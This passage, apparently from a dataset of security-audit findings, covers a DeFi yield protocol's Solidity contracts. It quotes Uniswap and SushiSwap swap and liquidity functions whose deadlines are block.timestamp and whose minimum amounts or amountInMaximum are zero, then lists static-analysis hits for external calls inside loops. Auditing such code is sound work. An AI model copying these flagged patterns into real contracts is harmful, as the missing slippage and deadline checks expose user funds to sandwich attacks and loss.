); require ( pools [ token0 ][ token1 ]. length > 0, \" UniswapTrader :: swapExactInput : Pool has not been added \" ); require ( tokenInErc20 . balanceOf ( address ( this )) >= amountIn , \" UniswapTrader :: swapExactInput : Balance is less than trade amount \" ); uint256 amountOutMinimum = getAmountOutMinimum ( tokenIn , tokenOut , amountIn ); IUniswapSwapRouter . ExactInputSingleParams memory exactInputSingleParams ; exactInputSingleParams . tokenIn = tokenIn ; exactInputSingleParams . tokenOut = tokenOut ; exactInputSingleParams . fee = pools [ token0 ][ token1 ][0]. feeNumerator ; exactInputSingleParams . recipient = recipient ; exactInputSingleParams . deadline = block . timestamp ; exactInputSingleParams . amountIn = amountIn ; exactInputSingleParams . amountOutMinimum = amountOutMinimum ; exactInputSingleParams . sqrtPriceLimitX96 = 0; ... } 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 31 Listing 14: UniswapTrader.sol (Lines 388,422) 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 function swapExactOutput ( address tokenIn , address tokenOut , address recipient , uint256 amountOut ) external override onlyController returns ( bool tradeSuccess ) { IERC20MetadataUpgradeable tokenInErc20 = IERC20MetadataUpgradeable ( tokenIn ); if ( isMultihopPair [ tokenIn ][ tokenOut ]) { Path memory path = getPathFor ( tokenIn , tokenOut ); IUniswapSwapRouter . ExactOutputParams memory params = IUniswapSwapRouter . ExactOutputParams ({ path : abi . encodePacked ( path . tokenIn , path . firstPoolFee , path . tokenInTokenOut , path . secondPoolFee , path . tokenOut ) , recipient : recipient , deadline : block . timestamp , amountOut : amountOut , amountInMaximum : 0 }) ; // Executes the swap . try IUniswapSwapRouter ( swapRouterAddress ). exactOutput ( params ) { tradeSuccess = true ; } catch { tradeSuccess = false ; tokenInErc20 . safeTransfer ( recipient , tokenInErc20 . balanceOf ( address ( this )) ); } return tradeSuccess ; } ( address token0 , address token1 ) = getTokensSorted ( tokenIn , tokenOut ); 32 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 require ( pools [ token0 ][ token1 ][0]. feeNumerator > 0, \" UniswapTrader :: swapExactOutput : Pool has not been added \" ); uint256 amountInMaximum = getAmountInMaximum ( tokenIn , tokenOut , amountOut ); require ( tokenInErc20 . balanceOf ( address ( this )) >= amountInMaximum , \" UniswapTrader :: swapExactOutput : Balance is less than trade amount \" ); IUniswapSwapRouter . ExactOutputSingleParams memory exactOutputSingleParams ; exactOutputSingleParams . tokenIn = tokenIn ; exactOutputSingleParams . tokenOut = tokenOut ; exactOutputSingleParams . fee = pools [ token0 ][ token1 ][0]. feeNumerator ; exactOutputSingleParams . recipient = recipient ; exactOutputSingleParams . deadline = block . timestamp ; exactOutputSingleParams . amountOut = amountOut ; exactOutputSingleParams . amountInMaximum = amountInMaximum ; exactOutputSingleParams . sqrtPriceLimitX96 = 0; ... } 33 Listing 15: DynamicRangeOrdersIntegration.sol (Lines 517) 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 function rerangeLiquidityPosition ( bytes32 liquidityPositionKey ) public onlyController { uint256 positionActualBaseStablecoinValue = getPositionBaseStablecoinValue ( liquidityPositionKey ); dynamicRangeOrdersIntegrationDeployer . decreaseLiquidityPosition ( liquidityPositionKey , positionActualBaseStablecoinValue ); ( uint256 amount0Desired , uint256 amount1Desired ) = getIncreaseLiquidityAmounts ( liquidityPositionKey , liquidityPositionKeyIndexes [ liquidityPositionKey ] ); if ( amount0Desired > 0 || amount1Desired > 0) { ( bool success , uint256 liquidityPositionId ) = dynamicRangeOrdersIntegrationDeployer . mintLiquidityPosition ( liquidityPositions [ liquidityPositionKey ]. token0 , liquidityPositions [ liquidityPositionKey ]. token1 , liquidityPositions [ liquidityPositionKey ]. feeNumerator , liquidityPositions [ liquidityPositionKey ]. tickLower , liquidityPositions [ liquidityPositionKey ]. tickUpper , amount0Desired , amount1Desired ); // If the mint succeeded , update the liquidity position data if ( success ) { liquidityPositions [ liquidityPositionKey ]. minted = true ; liquidityPositions [ liquidityPositionKey ]. id = liquidityPositionId ; 34 514 515 516 517 518 } } } lastRerangeTimestamp [ liquidityPositionKey ] = block . timestamp ; 35 Listing 16: DynamicRangeOrdersIntegrationDeployer.sol (Lines 228) ) address token0 , address token1 , uint24 fee , int24 tickLower , int24 tickUpper , uint256 amount0Desired , uint256 amount1Desired 184 function mintLiquidityPosition ( 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 if ( ) { { external override onlyController returns ( bool success , uint256 liquidityPositionId ) amount0Desired > IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this )) amount0Desired = IERC20MetadataUpgradeable ( token0 ). balanceOf 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 ( address ( this ) ); } if ( amount1Desired > IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this )) ) { amount1Desired = IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this ) ); } IUniswapPositionManager . MintParams memory mintParams ; mintParams . token0 = token0 ; mintParams . token1 = token1 ; mintParams . fee = fee ; mintParams . tickLower = tickLower ; mintParams . tickUpper = tickUpper ; mintParams . amount0Desired = amount0Desired ; mintParams . amount1Desired = amount1Desired ; 36 225 226 227 228 229 230 mintParams . amount0Min = 0; mintParams . amount1Min = 0; mintParams . recipient = address ( this ); mintParams . deadline = block . timestamp ; ... } 37 Listing 17: SushiSwapIntegration.sol (Lines 211) 169 function _deploy ( uint256 amount , uint256 pid ) internal { 170 ISushiSwapIntegration . InnerPool memory innerPoolInfo = 171 172 173 getPoolInfo ( pid ); require ( innerPoolInfo . added , \" SushiSwapIntegration :: deposit to sushiSwap yield farm : pool is not configured \" ); ( uint256 priceWithMultiplier , uint256 decimalsSubtractionExponent ) = getPriceWithMultiplier ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ) , address ( innerPoolInfo . poolInfo . lpToken ) , innerPoolInfo . tokenPair . token0 ); 174 ( uint256 amountTokenDesired , uint256 amountTokenMin , 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 uint256 amountWeiMin ) = calculateAmountOfTokenToAddLiquidityETH ( amount / 2, priceWithMultiplier ); uint256 tokensReceived ; if ( IERC20MetadataUpgradeable ( IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . getWethTokenAddress () ). balanceOf ( address ( this )) < amount ) { return ; } IWeth9 ( IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . getWethTokenAddress () ). withdraw ( amount ); if ( IERC20MetadataUpgradeable ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 )) . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) < amountTokenDesired / decimalsSubtractionExponent ) { uint [] memory amounts = swapExactETHForTokens ( amount / 2, (( amountTokenDesired - ( amountTokenDesired * 1 / 100) ) / decimalsSubtractionExponent ) , wethAddress , getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ) , address ( this ) ); 38 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 tokensReceived = amounts [1]; emit TokensReceived ( tokensReceived ); ( priceWithMultiplier ,) = getPriceWithMultiplier ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ) , address ( innerPoolInfo . poolInfo . lpToken ) , innerPoolInfo . tokenPair . token0 ); ( amountTokenDesired , amountTokenMin , amountWeiMin ) = calculateAmountOfTokenToAddLiquidityETH ( amount / 2, priceWithMultiplier ); } IERC20MetadataUpgradeable ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 )) . safeApprove ( swapRouterAddress , 0) ; IERC20MetadataUpgradeable ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 )) . safeApprove ( swapRouterAddress , IERC20MetadataUpgradeable ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 )) . allowance ( address ( this ) , swapRouterAddress ) + ( tokensReceived == 0 ? amountTokenDesired / decimalsSubtractionExponent : tokensReceived )) ; uint256 diff = amountTokenDesired / decimalsSubtractionExponent - ( tokensReceived == 0 ? amountTokenDesired / decimalsSubtractionExponent : tokensReceived ); (,, uint256 liquidity ) = ISushiSwapRouter ( swapRouterAddress ). addLiquidityETH { value : amount / 2}( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ) , ( amountTokenDesired / decimalsSubtractionExponent ) - diff , ( amountTokenMin / decimalsSubtractionExponent ) , amountWeiMin , address ( this ) , block . timestamp + 360 ); ...} 39 Listing 18: SushiSwapIntegration.sol (Lines 353) 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 function _withdraw ( uint256 poolid , uint amountPercent ) internal returns ( uint256 ) { uint256 liquidity = ISushiSwapMasterChef ( masterChef ). userInfo ( poolid , address ( this )) . amount * amountPercent / 10000; ISushiSwapIntegration . InnerPool memory innerPoolInfo = getPoolInfo ( poolid ); ISushiSwapMasterChef ( masterChef ). withdraw ( poolid , liquidity ); IERC20MetadataUpgradeable ( address ( innerPoolInfo . poolInfo . lpToken )) . safeApprove ( swapRouterAddress , liquidity ); address token = getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ); ( uint256 priceWithMultiplier , uint256 decimalsSubtractionExponent ) = getPriceWithMultiplier ( token , address ( innerPoolInfo . poolInfo . lpToken ) , innerPoolInfo . tokenPair . token0 ); (, uint256 amountTokenMin , uint256 amountWeiMin ) = calculateAmountOfTokenToAddLiquidityETH ( poolBalances [ poolid ] / 2 , priceWithMultiplier ); ( uint amountToken , ) = ISushiSwapRouter ( swapRouterAddress ) . removeLiquidityETH ( token , liquidity , amountTokenMin / decimalsSubtractionExponent , amountWeiMin , address ( this ) , block . timestamp + 360 ); ...} 40 Listing 19: SushiSwapIntegration.sol (Lines 372) 362 363 364 365 366 367 368 369 370 371 372 373 374 function swapExactETHForTokens ( uint256 amountWei , uint256 amountOutMin , address tokenIn , address tokenOut , address to ) internal returns ( uint [] memory ) { address [] memory path = new address [](2) ; path [0] = tokenIn ; path [1] = tokenOut ; uint256 deadline = block . timestamp ; return ISushiSwapRouter ( swapRouterAddress ). swapExactETHForTokens { value : amountWei }( amountOutMin , path , to , deadline ); 375 } Listing 20: SushiSwapIntegration.sol (Lines 391) 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 function swapExactInput ( address tokenIn , address tokenOut , address recipient , uint256 amountIn ) public override onlyController returns ( uint [] memory ) { uint256 amountOutMin = getAmountOutMinimum ( tokenIn , tokenOut , amountIn ); address [] memory path = new address [](2) ; path [0] = tokenIn ; path [1] = tokenOut ; uint256 deadline = block . timestamp ; IERC20MetadataUpgradeable ( tokenIn ). approve ( swapRouterAddress , amountIn ); return ISushiSwapRouter ( swapRouterAddress ). swapExactTokensForTokens ( amountIn , amountOutMin , path , recipient , deadline ); 396 } 41 Listing 21: UniswapIntegrationDeployer.sol (Lines 226) 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 function mintLiquidityPosition ( address token0 , address token1 , uint24 fee , int24 tickLower , int24 tickUpper , uint256 amount0Desired , uint256 amount1Desired ) { external override onlyController returns ( bool success , uint256 liquidityPositionId ) if ( amount0Desired > IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this )) ) { amount0Desired = IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this ) ); } if ( amount1Desired > IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this )) ) { amount1Desired = IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this ) ); } IUniswapPositionManager . MintParams memory mintParams ; mintParams . token0 = token0 ; mintParams . token1 = token1 ; mintParams . fee = fee ; mintParams . tickLower = tickLower ; mintParams . tickUpper = tickUpper ; mintParams . amount0Desired = amount0Desired ; mintParams . amount1Desired = amount1Desired ; 42 223 224 225 226 227 228 mintParams . amount0Min = 0; mintParams . amount1Min = 0; mintParams . recipient = address ( this ); mintParams . deadline = block . timestamp ; ... } 43 Listing 22: UniswapIntegrationDeployer.sol (Lines 277) 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 function increaseLiquidityPosition ( uint256 liquidityPositionId , address token0 , address token1 , uint256 amount0Desired , uint256 amount1Desired ) external override onlyController returns ( bool success ) { if ( amount0Desired > IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this )) ) { amount0Desired = IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this ) ); } if ( amount1Desired > IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this )) ) { amount1Desired = IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this ) ); } IUniswapPositionManager . IncreaseLiquidityParams memory increaseLiquidityParams ; increaseLiquidityParams . tokenId = liquidityPositionId ; increaseLiquidityParams . amount0Desired = amount0Desired ; increaseLiquidityParams . amount1Desired = amount1Desired ; increaseLiquidityParams . amount0Min = 0; increaseLiquidityParams . amount1Min = 0; increaseLiquidityParams . deadline = block . timestamp ; ... } 44 Listing 23: UniswapIntegrationDeployer.sol (Lines 450) function decreaseLiquidityPosition ( uint256 liquidityPositionIndex , uint256 baseStablecoinValue ) public override onlyController returns ( bool success ) { (, , , , , , uint256 liquidityPositionId , ) = uniswapIntegration . getLiquidityPosition ( liquidityPositionIndex ); ( , , , , , , , uint128 currentLiquidity , , , u", "labels": ["Halborn", "0x_Nodes", "Severity: Low"]}, {"title": "EXTERNAL FUNCTION CALLS WITHIN LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are many instances within contracts that use external function calls within a loop. Calls inside a loop might lead to a denial-of-service attack. Code Location: Listing 24: BiosRewards.sol (Lines ) 1 BiosRewards . getUserBiosRewards ( address ) ( contracts / core / BiosRewards . sol #141 -160) has external calls inside a loop : tokenId < integrationMap . getTokenAddressesLength () ( contracts / core / BiosRewards . sol #154 -156) 2 BiosRewards . getUserBiosRewards ( address ) ( contracts / core / BiosRewards . sol #141 -160) has external calls inside a loop : userBiosRewards += earned ( integrationMap . getTokenAddress ( tokenId ) , account ) ( contracts / core / BiosRewards . sol #156 -160) 3 EtherRewards . claimEthRewards ( address ) ( contracts / core / EtherRewards . sol #76 -90) has external calls inside a loop : token = IIntegrationMap ( integrationMap ). getTokenAddress ( tokenId ) ( contracts / core / EtherRewards . sol #87) 4 EtherRewards . getUserEthRewards ( address ) ( contracts / core / EtherRewards . sol #131 -145) has external calls inside a loop : token = IIntegrationMap ( integrationMap ). getTokenAddress ( tokenId ) ( contracts / core / EtherRewards . sol #142) 5 StrategyMap . updateIntegrations ( uint256 , IStrategyMap . WeightedIntegration []) ( contracts / core / StrategyMap . sol #121 -193) has external calls inside a loop : token = integrationMap . getTokenAddress ( i_scope_1 ) ( contracts / core / StrategyMap . sol #164) 6 StrategyMap . deleteStrategy ( uint256 ) ( contracts / core / StrategyMap . sol #195 -226) has external calls inside a loop : require ( bool , string )( getStrategyTokenBalance ( id , integrationMap . getTokenAddress ( i)) == 0, Strategy in use ) ( contracts / core / StrategyMap . sol #204 -207) 7 StrategyMap . enterStrategy ( uint256 , address , address [] , uint256 []) ( contracts / core / StrategyMap . sol #276 -312) has external calls inside a loop : require ( bool , string )( integrationMap . 47 getTokenAcceptingDeposits ( tokens [i ]) , Token unavailable ) ( contracts / core / StrategyMap . sol #294 -297) 8 StrategyMap . enterStrategy ( uint256 , address , address [] , uint256 []) ( contracts / core / StrategyMap . sol #276 -312) has external calls inside a loop : require ( bool , string )( userPositions . userTokenBalance ( tokens [ i], user ) >= amounts [ i], User lacks funds ) ( contracts / core / StrategyMap . sol #300 -303) 9 StrategyMap . exitStrategy ( uint256 , address , address [] , uint256 []) ( contracts / core / StrategyMap . sol #314 -345) has external calls inside a loop : require ( bool , string )( integrationMap . getTokenAcceptingWithdrawals ( tokens [i ]) , Token unavailable ) ( contracts / core / StrategyMap . sol #331 -334) 10 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : require ( bool , string )( integrationMap . getTokenAcceptingDeposits ( tokens [ tokenId ]) , UserPositions :: deposit : This token is not accepting deposits ) ( contracts / core / UserPositions . sol #110 -113) 11 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : beforeBalance = erc20 . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) ( contracts / core / UserPositions . sol #125 -127) 12 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : erc20 . safeTransferFrom ( depositor , moduleMap . getModuleAddress ( Modules . Kernel ) , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #130 -134) 13 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : afterBalance = erc20 . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) ( contracts / core / UserPositions . sol #137 -139) 14 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). increaseRewards ( tokens [ tokenId ], depositor , actualAmount ) ( contracts / core / UserPositions . sol #143 -144) 15 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )). updateUserRewards ( tokens [ tokenId ], depositor ) ( contracts / core / UserPositions . sol #145 -146) 48 16 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : require ( bool , string )( integrationMap . getTokenAcceptingWithdrawals ( tokens [ tokenId ]) , UserPositions :: _withdraw : This token is not accepting withdrawals ) ( contracts / core / UserPositions . sol #254 -257) 17 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IERC20MetadataUpgradeable ( tokens [ tokenId ]) . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) < amounts [ tokenId ] ( contracts / core / UserPositions . sol #264 -266) 18 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IERC20MetadataUpgradeable ( tokens [ tokenId ]) . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) < amounts [ tokenId ] ( contracts / core / UserPositions . sol #272 -274) 19 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : amounts [ tokenId ] = IERC20MetadataUpgradeable ( tokens [ tokenId ]) . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) ( contracts / core / UserPositions . sol #277 -278) 20 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). decreaseRewards ( tokens [ tokenId ], recipient , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #294 -295) 21 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )). updateUserRewards ( tokens [ tokenId ], recipient ) ( contracts / core / UserPositions . sol #297 -298) 22 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IERC20MetadataUpgradeable ( tokens [ tokenId ]) . safeTransferFrom ( moduleMap . getModuleAddress ( Modules . Kernel ) , recipient , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #286 -290) 23 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : integrationId < integrationMap . getIntegrationAddressesLength () ( contracts / core / UserPositions . sol #321) 24 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls 49 inside a loop : integrationAddress = integrationMap . getIntegrationAddress ( integrationId ) ( contracts / core / UserPositions . sol #324 -326) 25 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : desiredWithdrawAmount = ( amount * strategyMap . getIntegrationWeight ( integrationAddress )) / integrationWeightSum ( contracts / core / UserPositions . sol #327 -329) 26 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : desiredWithdrawAmount > IIntegration ( integrationAddress ). getBalance ( token ) ( contracts / core / UserPositions . sol #332 -333) 27 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : desiredWithdrawAmount = IIntegration ( integrationAddress ). getBalance ( token ) ( contracts / core / UserPositions . sol #335 -337) 28 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : IIntegration ( integrationAddress ). withdraw ( token , desiredWithdrawAmount ) ( contracts / core / UserPositions . sol #340) 29 UserPositions . fullyClosePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #355 -386) has external calls inside a loop : integration = IIntegration ( integrationMap . getIntegrationAddress ( integrationId )) ( contracts / core / UserPositions . sol #365 -367) 30 UserPositions . fullyClosePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #355 -386) has external calls inside a loop : integration . withdraw ( token , integration . getBalance ( token )) ( contracts / core / UserPositions . sol #370) 31 UserPositions . fullyClosePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #355 -386) has external calls inside a loop : integrationId == integrationMap . getIntegrationAddressesLength () - 1 || IERC20MetadataUpgradeable ( token ). balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) >= amount ( contracts / core / UserPositions . sol #373 -377) 32 UserPositions . transferToStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #394 -428) has external calls inside a loop : IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). decreaseRewards ( tokens [ tokenId ], recipient , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #418 -419) 50 33 UserPositions . transferToStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #394 -428) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )). updateUserRewards ( tokens [ tokenId ], recipient ) ( contracts / core / UserPositions . sol #421 -422) 34 UserPositions . transferFromStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #436 -465) has external calls inside a loop : require ( bool , string )( integrationMap . getTokenAcceptingDeposits ( tokens [ tokenId ]) , UserPositions :: deposit : This token is not accepting deposits ) ( contracts / core / UserPositions . sol #446 -449) 35 UserPositions . transferFromStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #436 -465) has external calls inside a loop : IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). increaseRewards ( tokens [ tokenId ], recipient , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #456 -457) 36 UserPositions . transferFromStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #436 -465) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )). updateUserRewards ( tokens [ tokenId ], recipient ) ( contracts / core / UserPositions . sol #458 -459) 37 UserPositions . _increaseBiosRewards () ( contracts / core / UserPositions . sol #473 -506) has external calls inside a loop : token = integrationMap . getTokenAddress ( tokenId ) ( contracts / core / UserPositions . sol #498) 38 UserPositions . _increaseBiosRewards () ( contracts / core / UserPositions . sol #473 -506) has external calls inside a loop : tokenBiosRewardWeight = integrationMap . getTokenBiosRewardWeight ( token ) ( contracts / core / UserPositions . sol #499 -501) 39 UserPositions . _claimBiosRewards ( address ) ( contracts / core / UserPositions . sol #561 -590) has external calls inside a loop : token = integrationMap . getTokenAddress ( tokenId ) ( contracts / core / UserPositions . sol #575) 40 UserPositions . _claimBiosRewards ( address ) ( contracts / core / UserPositions . sol #561 -590) has external calls inside a loop : biosRewards . earned ( token , recipient ) > 0 ( contracts / core / UserPositions . sol #577) 41 UserPositions . _claimBiosRewards ( address ) ( contracts / core / UserPositions . sol #561 -590) has external calls inside a loop : biosClaimed += IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). claimReward ( token , recipient ) ( contracts / core / UserPositions . sol #578 -580) 42 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : integration = 51 integrationMap . getIntegrationAddress ( i ) ( contracts / core / YieldManager . sol #152) 43 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : token = integrationMap . getTokenAddress (j ) ( contracts / core / YieldManager . sol #154) 44 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : numerator = integrationMap . getTokenReserveRatioNumerator ( token ) ( contracts / core / YieldManager . sol #155) 45 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : grossAmountInvested = strategyMap . getExpectedBalance ( integration , token ) ( contracts / core / YieldManager . sol #157 -160) 46 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : actualBalance = IIntegration ( integration ). getBalance ( token ) ( contracts / core / YieldManager . sol #165) 47 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : IERC20MetadataUpgradeable ( token ). balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) >= shortage ( contracts / core / YieldManager . sol #172 -174) 48 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : balanceBefore = IERC20MetadataUpgradeable ( token ). balanceOf ( integration ) ( contracts / core / YieldManager . sol #176 -178) 49 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : IERC20MetadataUpgradeable ( token ). safeTransferFrom ( moduleMap . getModuleAddress ( Modules . Kernel ) , integration , shortage ) ( contracts / core / YieldManager . sol #179 -183) 50 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : balanceAfter = IERC20MetadataUpgradeable ( token ). balanceOf ( integration ) ( contracts / core / YieldManager . sol #184 -186) 51 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : IIntegration ( integration ). deposit ( token , balanceAfter - balanceBefore ) ( contracts / core / YieldManager . sol #188 -191) 52 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : IIntegration ( integration ). withdraw ( token , actualBalance - desiredBalance ) ( contracts / core / YieldManager . sol #196 -199) 52 53 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : IIntegration ( integrationMap . getIntegrationAddress ( integrationId )) . harvestYield () ( contracts / core / YieldManager . sol #228 -229) 54 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / core / YieldManager . sol #233 -235) 55 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : harvestedTokenAmount = token . balanceOf ( address ( this )) ( contracts / core / YieldManager . sol #242) 56 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : token . safeTransfer ( moduleMap . getModuleAddress ( Modules . Kernel ) , tokenDesiredReserve - tokenActualReserve ) ( contracts / core / YieldManager . sol #252 -255) 57 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : token . safeTransfer ( moduleMap . getModuleAddress ( Modules . Kernel ) , token . balanceOf ( address ( this ))) ( contracts / core / YieldManager . sol #258 -261) 58 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / core / YieldManager . sol #278 -280) 59 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : token . balanceOf ( address ( this )) > 0 ( contracts / core / YieldManager . sol #282) 60 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : wethBalanceBefore = weth . balanceOf ( address ( this )) ( contracts / core / YieldManager . sol #287) 61 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : token . safeTransfer ( moduleMap . getModuleAddress ( Modules . UniswapTrader ) , token . balanceOf ( address ( this )) ) ( contracts / core / YieldManager . sol #290 -293) 62 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . swapExactInput ( address ( token ) , address ( weth ) , address ( this ) , token . balanceOf ( moduleMap . getModuleAddress ( Modules . UniswapTrader 